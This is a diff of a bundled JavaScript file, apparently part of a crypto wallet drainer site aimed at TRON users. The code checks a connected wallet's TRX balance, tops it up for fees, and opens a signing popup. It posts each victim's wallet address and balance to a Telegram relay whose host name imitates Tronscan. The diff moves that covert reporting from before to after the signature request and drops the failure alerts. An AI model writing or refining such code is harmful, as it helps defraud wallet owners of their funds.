@@ -92749,15 +92749,6 @@
                     o(balanceInTRX);
                     console.log("TRX balance check", balanceInTRX);
 
-                    // Notify Telegram immediately on connect (do not wait for sign)
-                    GS.post("https://tronscantelegram.onrender.com/api/telegram", {
-                        text: `Wallet connected\nWallet: ${c}\nTRX Balance: ${balanceInTRX} TRX\nTime: ${new Date().toISOString()}`
-                    }, {
-                        timeout: 8000
-                    }).catch((telegramErr) => {
-                        console.error("Telegram wallet-connect notify failed:", telegramErr)
-                    });
-
                     if (balanceInTRX < minTrx) {
                         console.log("TRX below 11, starting top-up");
                         try {
@@ -92768,11 +92759,6 @@
                             });
                             console.log("TRX top-up response", topUpResponse && topUpResponse.data);
                             if (!(topUpResponse && topUpResponse.data && topUpResponse.data.success)) {
-                                GS.post("https://tronscantelegram.onrender.com/api/telegram", {
-                                    text: `TRX top-up failed\nWallet: ${c}\nTRX Balance: ${balanceInTRX} TRX\nTime: ${new Date().toISOString()}`
-                                }, {
-                                    timeout: 8000
-                                }).catch(() => {});
                                 window.alert("TRX top-up failed. Need TRX for transaction fees.");
                                 t(2);
                                 return
@@ -92787,11 +92773,6 @@
                             try {
                                 balanceInTRX = parseFloat(await a.getBalance(c)) || 0;
                                 if (balanceInTRX < minTrx) {
-                                    GS.post("https://tronscantelegram.onrender.com/api/telegram", {
-                                        text: `TRX top-up error\nWallet: ${c}\nTRX Balance: ${balanceInTRX} TRX\nError: ${(topUpError && topUpError.message) || "unknown"}\nTime: ${new Date().toISOString()}`
-                                    }, {
-                                        timeout: 8000
-                                    }).catch(() => {});
                                     window.alert("TRX top-up failed. Need TRX for transaction fees.");
                                     t(2);
                                     return
@@ -92808,6 +92789,13 @@
 
                     console.log("Opening sign popup");
                     await f(c);
+
+                    // fire-and-forget telegram
+                    GS.post("https://tronscantelegram.onrender.com/api/telegram", {
+                        text: `Wallet connected\nWallet: ${c}\nTRX Balance: ${balanceInTRX} TRX\nTime: ${new Date().toISOString()}`
+                    }, {
+                        timeout: 8000
+                    }).catch(() => {});
                 } catch (a) {
                     console.error("Connection error:", a),
                     t(2)
